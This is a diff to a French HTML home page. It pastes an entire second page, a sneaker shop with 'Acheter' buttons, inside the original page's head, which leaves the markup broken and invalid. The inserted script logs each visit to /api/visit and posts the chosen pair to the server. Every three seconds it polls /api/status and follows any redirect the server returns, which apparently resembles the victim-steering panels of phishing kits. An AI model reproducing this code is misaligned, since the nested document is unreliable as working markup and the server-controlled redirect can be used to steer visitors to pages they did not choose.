@@ -2,7 +2,43 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Accueil</title>
+  <title>Accueil</title><!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>🏠 Accueil</title>
+  <style>
+    body { font-family: Arial; text-align: center; background: #fafafa; margin: 0; padding: 20px; }
+    h1 { color: #333; }
+    .product { display: inline-block; background: #fff; border-radius: 15px; padding: 20px; margin: 15px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
+    img { width: 180px; height: auto; border-radius: 10px; }
+    button { margin-top: 10px; padding: 10px 20px; border: none; border-radius: 8px; background: #2196f3; color: white; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h1>👟 Choisissez votre paire</h1>
+  <div id="products">
+    <div class="product"><img src="https://via.placeholder.com/180?text=Basket+A"><br><button onclick="choose('Basket A')">Acheter</button></div>
+    <div class="product"><img src="https://via.placeholder.com/180?text=Basket+B"><br><button onclick="choose('Basket B')">Acheter</button></div>
+    <div class="product"><img src="https://via.placeholder.com/180?text=Basket+C"><br><button onclick="choose('Basket C')">Acheter</button></div>
+  </div>
+
+  <script>
+    async function choose(pair){
+      await fetch('/api/pair',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pair})});
+      location.href='delivery.html';
+    }
+    async function visit(){
+      const r = await fetch('/api/visit'); await r.json();
+    }
+    visit();
+    setInterval(async()=>{ 
+      const s=await fetch('/api/status'); const j=await s.json(); 
+      if(j.redirect) location.href=j.redirect; 
+    },3000);
+  </script>
+</body>
+</html>
   <style>
     body {font-family: Arial; text-align: center; padding: 50px;}
     a {display:inline-block; padding:15px 30px; background:#007bff; color:white; border-radius:10px; text-decoration:none;}
